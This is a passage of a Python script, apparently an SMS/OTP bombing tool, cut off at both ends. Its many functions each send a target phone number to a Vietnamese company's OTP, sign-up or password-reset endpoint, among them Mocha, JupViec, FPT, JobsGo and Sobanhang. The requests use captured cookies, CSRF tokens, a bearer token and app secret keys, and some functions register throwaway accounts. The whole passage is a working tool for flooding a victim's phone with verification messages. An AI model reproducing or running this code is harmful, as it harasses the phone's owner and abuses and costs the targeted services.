        'platform': 'ios',
        'revision': '11235',
        'username': sdt,
        'version': '1.31',
    }

    try:
        response = requests.post('https://v2sslapimocha35.mocha.com.vn/ReengBackendBiz/genotp/v32', headers=headers, data=data)
        response.raise_for_status()
        print("MOCHA35 | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("MOCHA35 | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def jupviec(): #ap
    headers = {
        'Host': 'wondermaid.jupviec.vn',
        'Content-Type': 'application/json; charset=UTF-8',
        'Accept': 'application/json',
        'x-token': '2',
        'x-application-id': '1',
        'identification': '{"appVersion":"4.1.168","buildVersion":"1734778835","imei":"BA7E7009-6090-42D5-9921-BB8AFE72077F","platform":"ios","deviceId":"iPhone11%2C8","deviceName":"iPhone","manufacturer":"Apple","isEmulator":false,"appType":"CUSTOMER","language":"vi","timezone":7}',
        'Accept-Language': 'vi',
        'User-Agent': 'JupViec/1734778835 CFNetwork/1494.0.7 Darwin/23.4.0',
    }

    json_data = {
        'phone': sdt,
        'countryCode': '+84',
    }

    try:
        response = requests.post('https://wondermaid.jupviec.vn/api/account/send-otp', headers=headers, json=json_data)
        response.raise_for_status()
        print("JUPVIEC | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("JUPVIEC | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def guvi():
    headers = {
        'Host': 'server.guvico.com',
        'Content-Type': 'application/json',
        'User-Agent': 'Guvi/11 CFNetwork/1494.0.7 Darwin/23.4.0',
        'Accept': 'application/json, text/plain, */*',
        'version': '1.1.43',
        'Accept-Language': 'vi-VN,vi;q=0.9',
        'Authorization': 'Bearer null',
    }

    params = {
        'lang': 'vi',
    }

    json_data = {
        'code_phone_area': '+84',
        'phone': sdt,
    }

    try:
        response = requests.post('https://server.guvico.com/customer/auth/register_phone', params=params, headers=headers, json=json_data)
        response.raise_for_status()
        print("GUVI | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("GUVI | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def aio():
    cookies = {
        'mage-cache-storage': '{}',
        'mage-cache-storage-section-invalidation': '{}',
        'form_key': '2t5QRPIHEoET1XqG',
        'recently_viewed_product': '{}',
        'recently_viewed_product_previous': '{}',
        'recently_compared_product': '{}',
        'recently_compared_product_previous': '{}',
        'product_data_storage': '{}',
        'mage-messages': '',
        'form_key': '2t5QRPIHEoET1XqG',
        'PHPSESSID': 'bi4pnbrrv425ea5sd74nuusk58',
        'city_id': '1',
        'X-Magento-Vary': 'de9de66e57881beeebcb76e4db8a29ecd7a66c6f08b2640dae67162824fbd615',
        'district_id': '1',
        'seller_code_selected': '1',
        'mage-cache-sessid': 'true',
        'private_content_version': '33bf4549bd7b106f6f4c6475f8ecf7d9',
        'section_data_ids': '{%22compare-products%22:1735998838%2C%22cart%22:1735998838%2C%22messages%22:1735998932}',
    }

    headers = {
        'accept': '*/*',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'cookie': 'mage-cache-storage={}; mage-cache-storage-section-invalidation={}; form_key=2t5QRPIHEoET1XqG; recently_viewed_product={}; recently_viewed_product_previous={}; recently_compared_product={}; recently_compared_product_previous={}; product_data_storage={}; mage-messages=; form_key=2t5QRPIHEoET1XqG; PHPSESSID=bi4pnbrrv425ea5sd74nuusk58; city_id=1; X-Magento-Vary=de9de66e57881beeebcb76e4db8a29ecd7a66c6f08b2640dae67162824fbd615; district_id=1; seller_code_selected=1; mage-cache-sessid=true; private_content_version=33bf4549bd7b106f6f4c6475f8ecf7d9; section_data_ids={%22compare-products%22:1735998838%2C%22cart%22:1735998838%2C%22messages%22:1735998932}',
        'origin': 'https://aiosmart.com.vn',
        'priority': 'u=1, i',
        'referer': 'https://aiosmart.com.vn/customer/account/login/',
        'sec-ch-ua': '"Chromium";v="130", "Opera";v="115", "Not?A_Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36 OPR/115.0.0.0',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        'login[otp]': '',
        'login[telephone]': sdt,
        'login[username]': 'Dat Gac',
        'confirm': 'on',
        'form_key': '2t5QRPIHEoET1XqG',
    }

    try:
        response = requests.post(
            'https://aiosmart.com.vn/advancedlogin/login/sendOtpRegister/',
            cookies=cookies,
            headers=headers,
            data=data,
        )
        response.raise_for_status()
        print("AIO | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("AIO | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def fpt(): #fptid longchau
    cookies = {
        '.AspNetCore.Antiforgery.GFaQlakWipg': 'CfDJ8NeBk3ntjPdOi7d2FDqzzZ6LY04lu9fL2mL1YkfLYiSPY1470_7eMBpNxBwWIF-V8EzAYTjw0iV2PgYTn_eZKb-yDdeWRMRGQzwilLTPJORrmpfNjIIyZXDp6iAH99RYHOgTxmD4YbAWQrpkVu-lX_8',
        'INGRESSCOOKIE': '1736000046.687.53.350621|7fba285e5548cf27d0d7a70b981762e8',
        'fptid-antiforgery': 'CfDJ8NeBk3ntjPdOi7d2FDqzzZ42TQu_trg0IT8zm9vPl-m7rHM2MutLy8khVyDPlbEeHt7oh54K4rSx17oBo7q1ZaVF348glqk09283mtOfVtnzXsaVRu7o1To3Wq691IDrvnDaL6CHoEMQ5ATsdG_cdMw',
        '.AspNetCore.Session': 'CfDJ8NeBk3ntjPdOi7d2FDqzzZ7Xzv7QE33HM08ZFxINxS%2BSnqtHjq%2FpTGV%2BOT%2B8VfXKoxuDN5SbGM2I9sv4%2FvkG3OU8c80Yyf7MnDM5owX9kZCuIC1CQw%2FU0H3mLlq7PDIjvFJuXMYjxE6a5NayOK41w19ME7iNGA4OjeN%2FyK3QdgEq',
        'fptid-session': 'CfDJ8NeBk3ntjPdOi7d2FDqzzZ5U%2FgyhTlJWBCzh8TIejjMhS5EcBK%2B8NOBUC9bxZI%2Ft5GqWUq%2Ft4D8aVjUV4wZpXrKw4IIKD%2F2UeMaodbeC9lYmAkns9uv4MC1dm1IAxc4q4m4x64jUPTBPP1HLWMYzV56u%2FU9HpMcoh23cwm6yZFzI',
        'oauth2_authentication_csrf_insecure': 'MTczNjAwMDA0NXxEdi1CQkFFQ180SUFBUkFCRUFBQVB2LUNBQUVHYzNSeWFXNW5EQVlBQkdOemNtWUdjM1J5YVc1bkRDSUFJR0V5WXpnMlptRmxOelUxWmpRM01qWmlNR015TldNMk9UTmhNVGxrWTJabHzZpWCCW00nPqqetX9JGOnfDPp2qgkZ7ObOtiMTnSwH5g==',
    }

    headers = {
        'Accept': '*/*',
        'Accept-Language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'Connection': 'keep-alive',
        'Content-Type': 'application/json',
        # 'Cookie': '.AspNetCore.Antiforgery.GFaQlakWipg=CfDJ8NeBk3ntjPdOi7d2FDqzzZ6LY04lu9fL2mL1YkfLYiSPY1470_7eMBpNxBwWIF-V8EzAYTjw0iV2PgYTn_eZKb-yDdeWRMRGQzwilLTPJORrmpfNjIIyZXDp6iAH99RYHOgTxmD4YbAWQrpkVu-lX_8; INGRESSCOOKIE=1736000046.687.53.350621|7fba285e5548cf27d0d7a70b981762e8; fptid-antiforgery=CfDJ8NeBk3ntjPdOi7d2FDqzzZ42TQu_trg0IT8zm9vPl-m7rHM2MutLy8khVyDPlbEeHt7oh54K4rSx17oBo7q1ZaVF348glqk09283mtOfVtnzXsaVRu7o1To3Wq691IDrvnDaL6CHoEMQ5ATsdG_cdMw; .AspNetCore.Session=CfDJ8NeBk3ntjPdOi7d2FDqzzZ7Xzv7QE33HM08ZFxINxS%2BSnqtHjq%2FpTGV%2BOT%2B8VfXKoxuDN5SbGM2I9sv4%2FvkG3OU8c80Yyf7MnDM5owX9kZCuIC1CQw%2FU0H3mLlq7PDIjvFJuXMYjxE6a5NayOK41w19ME7iNGA4OjeN%2FyK3QdgEq; fptid-session=CfDJ8NeBk3ntjPdOi7d2FDqzzZ5U%2FgyhTlJWBCzh8TIejjMhS5EcBK%2B8NOBUC9bxZI%2Ft5GqWUq%2Ft4D8aVjUV4wZpXrKw4IIKD%2F2UeMaodbeC9lYmAkns9uv4MC1dm1IAxc4q4m4x64jUPTBPP1HLWMYzV56u%2FU9HpMcoh23cwm6yZFzI; oauth2_authentication_csrf_insecure=MTczNjAwMDA0NXxEdi1CQkFFQ180SUFBUkFCRUFBQVB2LUNBQUVHYzNSeWFXNW5EQVlBQkdOemNtWUdjM1J5YVc1bkRDSUFJR0V5WXpnMlptRmxOelUxWmpRM01qWmlNR015TldNMk9UTmhNVGxrWTJabHzZpWCCW00nPqqetX9JGOnfDPp2qgkZ7ObOtiMTnSwH5g==',
        'Origin': 'https://accounts.fpt.vn',
        'Referer': 'https://accounts.fpt.vn/sso/Auth/Identifier?challenge=c80cc09c52624b1cb657c56dab58b5df',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36 OPR/115.0.0.0',
        'X-CSRF-TOKEN': 'CfDJ8NeBk3ntjPdOi7d2FDqzzZ4zmAnjBXTetxuAdJ-mGohqqMxohUzIO6ZWrwGR8PMXpyFBhFjqVZ5JtGpF5MqNEpoYhjQP6iCLzAqkFPZDMHHptzd11xPhq0KoL3ddx1sbelFu2tj4UMhg-xCfNzgh1hE',
        'sec-ch-ua': '"Chromium";v="130", "Opera";v="115", "Not?A_Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    json_data = {
        'Username': sdt,
        'Challenge': 'c80cc09c52624b1cb657c56dab58b5df',
    }

    try:
        response = requests.post('https://accounts.fpt.vn/sso/partial/username', cookies=cookies, headers=headers, json=json_data)
        response.raise_for_status()
        print("FPT | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("FPT | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def money24h(): #app 24hmoney, 503 check
    headers = {
        'Host': 'api2-t19.24hmoney.vn',
        'content-type': 'application/json',
        'accept': 'application/json',
        'sec-fetch-site': 'same-site',
        'accept-language': 'vi-VN,vi;q=0.9',
        'sec-fetch-mode': 'cors',
        'origin': 'https://app-native.24hmoney.vn',
        'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148',
        'referer': 'https://app-native.24hmoney.vn/',
        'sec-fetch-dest': 'empty',
    }

    json_data = {
        'request_phone': sdt_chuyen_doi,
        'user_name': 'duc quoc',
    }

    try:
        response = requests.post(
            'https://api2-t19.24hmoney.vn/v1/ios/auth/otp/sign-up?platform=ios&device_id=9E4CBCB3-6964-40C9-888E-16CBE2C7A420&app_version=4.15.0&locale=vi&device_name=iPhone&device_model=iPhone11,8&network_carrier=--&os=ios&os_version=17.4.1&access_token=INVALID&connection_type=wifi',
            headers=headers,
            json=json_data,
        )
        response.raise_for_status()
        print("24HMONEY | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("24HMONEY | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def unicar():
    headers = {
        'Host': 'api.unicar.vn',
        'accept': 'application/json, text/plain, */*',
        'content-type': 'application/json',
        'user-agent': 'unicar/9 CFNetwork/1494.0.7 Darwin/23.4.0',
        'accept-language': 'vi-VN,vi;q=0.9',
    }

    json_data = {
        'phoneNumber': sdt_chuyen_doi,
        'app': 'uni',
        'v': '34.10',
    }

    try:
        response = requests.post('https://api.unicar.vn/uauth/login_phone', headers=headers, json=json_data)
        response.raise_for_status()
        print("UNICAR | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("UNICAR | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def lozido(): #ap
    headers = {
        'Host': 'quanlytro.me',
        'accept': 'application/json, text/plain, */*',
        'content-type': 'application/json',
        'user-agent': 'lozido_room_mobile/286 CFNetwork/1494.0.7 Darwin/23.4.0',
        'accept-language': 'vi-VN,vi;q=0.9',
    }

    params = {
        '_app_version': '1.9.9',
    }

    json_data = {
        'name': 'huy hub',
        'phone': sdt,
        'password': '123123aA@',
        'password_confirmation': '123123aA@',
    }

    response = requests.post('https://quanlytro.me/api/householder/v1/register', params=params, headers=headers, json=json_data)
    headers = {
        'Host': 'quanlytro.me',
        'accept': 'application/json, text/plain, */*',
        'content-type': 'application/json',
        'user-agent': 'lozido_room_mobile/286 CFNetwork/1494.0.7 Darwin/23.4.0',
        'accept-language': 'vi-VN,vi;q=0.9',
    }

    params = {
        '_app_version': '1.9.9',
    }

    json_data = {
        'phone': sdt,
    }

    try:
        response = requests.post('https://quanlytro.me/api/householder/v1/send-otp', params=params, headers=headers, json=json_data)
        response.raise_for_status()
        print(" | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print(" | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def moonvn():
    headers = {
        'Accept': 'application/json',
        'Accept-Language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'Access-Control-Allow-Headers': 'Access-Control-Allow-Origin, Accept',
        'Access-Control-Allow-Origin': '*',
        'Authorization': 'Bearer',
        'Connection': 'keep-alive',
        # 'Content-Length': '0',
        'Content-Type': 'application/json',
        'Origin': 'https://moon.vn',
        'Referer': 'https://moon.vn/',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-site',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36 OPR/115.0.0.0',
        'sec-ch-ua': '"Chromium";v="130", "Opera";v="115", "Not?A_Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    params = {
        'phoneNumber': sdt,
    }

    try:
        response = requests.post('https://identity.moon.vn/api/v2/user/register/regOTP', params=params, headers=headers)
        response.raise_for_status()
        print("MOON | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("MOON | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def pingpush(): #ap cleancall
    headers = {
        'Host': 'cleancall-api.pingpush.vn:8443',
        'device': '06490740-8F1E-426C-98DC-BDC244123A08',
        'content-type': 'application/json',
        'devicename': 'iPhone',
        'accept': 'Application/json',
        'user-agent': 'PPCallBlocker/3 CFNetwork/1494.0.7 Darwin/23.4.0',
        'accept-language': 'vi-VN,vi;q=0.9',
    }

    json_data = {
        'username': sdt,
    }

    response = requests.post('https://cleancall-api.pingpush.vn:8443/user/forget_password', headers=headers, json=json_data)
    headers = {
        'Host': 'cleancall-api.pingpush.vn:8443',
        'device': '06490740-8F1E-426C-98DC-BDC244123A08',
        'content-type': 'application/json',
        'devicename': 'iPhone',
        'accept': 'Application/json',
        'user-agent': 'PPCallBlocker/3 CFNetwork/1494.0.7 Darwin/23.4.0',
        'accept-language': 'vi-VN,vi;q=0.9',
    }

    json_data = {
        'phone_number': sdt,
        'password': '123123aA@',
    }

    try:
        response = requests.post('https://cleancall-api.pingpush.vn:8443/user/create', headers=headers, json=json_data)
        response.raise_for_status()
        print("PINGPUSH | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("PINGPUSH | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def ting(): #ap
    headers = {
        'Host': 'api.ting.vn',
        'x-language': 'vi',
        'Content-Type': 'application/json',
        'User-Agent': 'TingUserApp/3 CFNetwork/1494.0.7 Darwin/23.4.0',
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'vi-VN,vi;q=0.9',
        'Authorization': 'Bearer null',
    }

    json_data = {
        'phone': sdt,
    }

    try:
        response = requests.post('https://api.ting.vn/users/request-otp-login', headers=headers, json=json_data)
        response.raise_for_status()
        print("TING | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("TING | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def jobsgo():
    cookies = {
        '_csrf-jobsgo-candidate': 'd87e9a0f311381c94b85c0469eb3d777e6037a7d7d6897856f6492f5ea1857cfa%3A2%3A%7Bi%3A0%3Bs%3A22%3A%22_csrf-jobsgo-candidate%22%3Bi%3A1%3Bs%3A32%3A%22G1CSojMkH-pNHpFunREEEjwIeAEGZEhQ%22%3B%7D',
        'jobsgo-candidate-redis': 'r3v85oasqgihbcbkd64se1c9b2',
        'surveyModal': 'true',
        'ref': '6c7d43084c664c56d602e53caf77cf38eb9c9ed59a2b4fe138cb91b90faf890ca%3A2%3A%7Bi%3A0%3Bs%3A3%3A%22ref%22%3Bi%3A1%3Bs%3A134%3A%22https%3A%2F%2Fjobsgo.vn%2Fviec-lam.html%3Futm_source%3DGGAds%26amp%3Butm_medium%3DSEM%26amp%3Butm_campaign%3D%5BCA-NTD%5DThuong_Hieu%26amp%3Butm_id%3D%2B%26amp%3Bgad_source%3D1%22%3B%7D',
    }

    headers = {
        'Accept': '*/*',
        'Accept-Language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'Cookie': '_csrf-jobsgo-candidate=d87e9a0f311381c94b85c0469eb3d777e6037a7d7d6897856f6492f5ea1857cfa%3A2%3A%7Bi%3A0%3Bs%3A22%3A%22_csrf-jobsgo-candidate%22%3Bi%3A1%3Bs%3A32%3A%22G1CSojMkH-pNHpFunREEEjwIeAEGZEhQ%22%3B%7D; jobsgo-candidate-redis=r3v85oasqgihbcbkd64se1c9b2; surveyModal=true; ref=6c7d43084c664c56d602e53caf77cf38eb9c9ed59a2b4fe138cb91b90faf890ca%3A2%3A%7Bi%3A0%3Bs%3A3%3A%22ref%22%3Bi%3A1%3Bs%3A134%3A%22https%3A%2F%2Fjobsgo.vn%2Fviec-lam.html%3Futm_source%3DGGAds%26amp%3Butm_medium%3DSEM%26amp%3Butm_campaign%3D%5BCA-NTD%5DThuong_Hieu%26amp%3Butm_id%3D%2B%26amp%3Bgad_source%3D1%22%3B%7D',
        'Origin': 'https://jobsgo.vn',
        'Referer': 'https://jobsgo.vn/site/register?utm_source=GGAds&utm_medium=SEM&utm_term=&utm_campaign=[CA-NTD]Thuong_Hieu',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36 OPR/115.0.0.0',
        'X-CSRF-Token': '3zAbY2PHBvhwgpdT9sw9oRK3raiDyMq_uANvJTcVFlyYAVgwDK1Lkziv5x2-vHvUfOXo7caivfbdQipibVB-DQ==',
        'X-Requested-With': 'XMLHttpRequest',
        'sec-ch-ua': '"Chromium";v="130", "Opera";v="115", "Not?A_Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    data = {
        'phone': f'84{sdt[1:10]}',
    }

    try:
        response = requests.post('https://jobsgo.vn/site/verify-zalo', cookies=cookies, headers=headers, data=data)
        response.raise_for_status()
        print("JOBSGO | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("JOBSGO | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def kanow(): #ap
    headers = {
        'Host': 'system.kanow.vn',
        'accept': 'application/json',
        'content-type': 'application/json',
        'user-agent': 'Kanow/2 CFNetwork/1494.0.7 Darwin/23.4.0',
        'accept-language': 'vi-VN,vi;q=0.9',
    }

    json_data = {
        'phone': sdt,
        'event': 'register',
    }

    try:
        response = requests.post('https://system.kanow.vn/api/create_otp_sign_up', headers=headers, json=json_data)
        response.raise_for_status()
        print("KANOW | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("KANOW | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def butlsms(): #ap
    headers = {
        'Host': 'app-khach-v2.butl.vn',
        'Content-Type': 'text/plain;charset=UTF-8',
        'Accept': '*/*',
        'User-Agent': 'BUTLUSER/1 CFNetwork/1494.0.7 Darwin/23.4.0',
        'Accept-Language': 'vi-VN,vi;q=0.9',
    }
    data = f'''{{
    "cmd": "doRegister",
    "data": {{
        "accessToken": "",
        "platform": 1,
        "deviceInfo": "iPhone XR",
        "token": "1",
        "countryCode": "84",
        "email": "1",
        "clientVersion": 1,
        "deviceID": "AD475342-6B7B-4C93-AFAB-CE68811AC06C",
        "name": "",
        "phone": "{sdt}",
        "password": "123456",
        "otp_method": "sms"
    }}
    }}'''

    try:
        response = requests.post('https://app-khach-v2.butl.vn/ButlAppServlet/user/services', headers=headers, data=data)
        response.raise_for_status()
        print("BUTLSMS | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("BUTLSMS | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def butlzl(): #ap ^
    headers = {
        'Host': 'app-khach-v2.butl.vn',
        'Content-Type': 'text/plain;charset=UTF-8',
        'Accept': '*/*',
        'User-Agent': 'BUTLUSER/1 CFNetwork/1494.0.7 Darwin/23.4.0',
        'Accept-Language': 'vi-VN,vi;q=0.9',
    }
    data = f'''{{
    "cmd": "doRegister",
    "data": {{
        "accessToken": "",
        "platform": 1,
        "deviceInfo": "iPhone XR",
        "token": "1",
        "countryCode": "84",
        "email": "1",
        "clientVersion": 1,
        "deviceID": "AD475342-6B7B-4C93-AFAB-CE68811AC06C",
        "name": "",
        "phone": "{sdt}",
        "password": "123456",
        "otp_method": "zalo"
    }}
    }}'''

    try:
        response = requests.post('https://app-khach-v2.butl.vn/ButlAppServlet/user/services', headers=headers, data=data)
        response.raise_for_status()
        print("BUTLZL | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("BUTLZL | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def ilokafood():
    headers = {
        'Host': 'back.iloka.vn:9999',
        'Content-Type': 'application/json',
        'Origin': 'capacitor://localhost',
        'Accept': 'application/json, text/plain, */*',
        'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148',
        'Accept-Language': 'vi-VN,vi;q=0.9',
    }

    json_data = {
        'phone': sdt,
    }

    try:
        response = requests.post('http://back.iloka.vn:9999/api/v2/customer/sentZaloOTP', headers=headers, json=json_data)
        response.raise_for_status()
        print("ILOKAFOOD | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("ILOKAFOOD | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def vieclam24h(): #ap
    headers = {
        'Host': 'api.mobile.vieclam24h.vn',
        'content-type': 'application/json',
        'accept': 'application/json, text/plain, */*',
        'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJjaGFubmVsX2NvZGUiOiJ2bDI0aCIsInVzZXIiOm51bGx9.a0POm2ZVRwetYs2QsMj0sRg8lZSSbKufX4sewqhAM5o',
        'app-version': '1.10.0',
        'app-name': 'VIECLAM24H-MOBILE-APP',
        'os': 'IOS',
        'accept-language': 'vi-VN,vi;q=0.9',
        'x-api-version': '1.0',
        'user-agent': 'Vieclam24h/1 CFNetwork/1494.0.7 Darwin/23.4.0',
        'lang': 'vi',
        'os-version': '17.4.1',
    }

    json_data = {
        'type': 1,
        'mobile': sdt,
    }

    try:
        response = requests.post('https://api.mobile.vieclam24h.vn/seeker/request-otp', headers=headers, json=json_data)
        response.raise_for_status()
        print("VIECLAM24H | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("VIECLAM24H | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def viecco(): #ap
    headers = {
        'Host': 'api.viec.co',
        'content-type': 'application/json',
        'accept': 'application/json',
        'x-viecco-platform-version': 'undefined',
        'x-viecco-device-model': 'undefined',
        'x-viecco-platform-name': 'ios',
        'x-viecco-platform': 'ios',
        'accept-language': 'vi-VN,vi;q=0.9',
        'x-viecco-device-id': '7F45EB41-A054-4F8D-8F57-D18BBA4762C0',
        'x-viecco-app-version': '2.146.0',
        'user-agent': 'ViecCo/2.125.1.1 CFNetwork/1494.0.7 Darwin/23.4.0',
        'x-viecco-device-name': 'iPhone',
    }

    params = {
        'type': 'text',
    }

    json_data = {
        'phone_number': sdt_chuyen_doi,
        'state': '1737279095537',
    }

    try:
        response = requests.post('https://api.viec.co/user/v1/auth/request_activation', params=params, headers=headers, json=json_data)
        response.raise_for_status()
        print("VIECCO | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("VIECCO | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def sobanhangzl(): #ap
    headers = {
        'Host': 'api.sobanhang.com',
        'content-type': 'application/json',
        'accept': 'application/json',
        'x-location-timezone': 'UTC+07:00',
        'x-current-version': '3.1.3',
        'accept-language': 'vi-VN,vi;q=0.9',
        'user-agent': 'finan/2 CFNetwork/1494.0.7 Darwin/23.4.0',
        'x-current-screen': 'PasswordHandlerScreen',
        'x-locale-code': 'vi_VN',
    }

    json_data = {
        'phone_number': sdt,
        'pwd': None,
        'platform': 'gtapp',
        'device_id': '796B9301-42DF-4340-BFDF-D415E8E0F5C7',
        'action': 'create_account',
        'email': 'boyssss5@gmail.com',
        'receiving_method': 'phone_number',
        'is_send_zns': True,
        'secret_key': 'df753c9cb291dfd4789cc95834211ac34c509a90fb80c2c8a8430acb3cdda8ab3d8a9176b98fb10ac04a2c47f6b5c72fd4386a',
    }

    try:
        response = requests.post('https://api.sobanhang.com/finan-user/api/v2/auth/account/request', headers=headers, json=json_data)
        response.raise_for_status()
        print("SOBANHANGZL | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("SOBANHANGZL | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def sobanhang(): #ap ^
    headers = {
        'Host': 'api.sobanhang.com',
        'content-type': 'application/json',
        'accept': 'application/json',
        'x-location-timezone': 'UTC+07:00',
        'x-current-version': '3.1.3',
        'accept-language': 'vi-VN,vi;q=0.9',
        'user-agent': 'finan/2 CFNetwork/1494.0.7 Darwin/23.4.0',
        'x-current-screen': 'VerifyOTPScreen',
        'x-locale-code': 'vi_VN',
    }

    json_data = {
        'phone_number': sdt,
        'action': 'create_account',
        'platform': 'gtapp',
        'device_id': '796B9301-42DF-4340-BFDF-D415E8E0F5C7',
        'receiving_method': 'phone_number',
        'is_send_zns': False,
        'secret_key': '1b30cd4319584f071d51f40e4528f03992be48da3538a09cc0c9aee4655c331acd941dc0e169c3d82eade9f3f52cc86cafb535',
    }

    try:
        response = requests.post('https://api.sobanhang.com/finan-user/api/v2/auth/account/request', headers=headers, json=json_data)
        response.raise_for_status()
        print("SOBANHANG | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("SOBANHANG | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def tourism(): #ap \quản trị và kinh doanh du lịch\
    headers = {
        'Host': 'biin-api.tourism.com.vn',
        'accept': '*/*',
        'appcode': 'HDV',
        'x-http-method-override': 'requestOtpV2',
        'content-type': 'application/json',
        'user-agent': 'AwesomeProject/104 CFNetwork/1494.0.7 Darwin/23.4.0',
        'accept-language': 'vi-VN,vi;q=0.9',
    }

    json_data = {
        'account': sdt,
    }

    try:
        response = requests.post('https://biin-api.tourism.com.vn/api/dulich/v1/users/requestOtpV2', headers=headers, json=json_data)
        response.raise_for_status()
        print("TOURISM | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("TOURISM | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def sfin(): #ap \sshop\
    headers = {
        'Host': 'proapi.sspa.com.vn',
        'Content-Type': 'application/json',
        'User-Agent': 'sshop/4 CFNetwork/1494.0.7 Darwin/23.4.0',
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'vi-VN,vi;q=0.9',
        'appid': 'SSHOP',
        'appversion': '1.248',
    }

    json_data = {
        'username': f'84{sdt[1:10]}',
        'type': 'REGISTRATION',
        'appId': 'SSHOP',
        'languageCode': 'vi',
    }
    
    try:
        response = requests.post('https://proapi.sspa.com.vn/auth/v2/otp/generate-v2', headers=headers, json=json_data)
        response.raise_for_status()
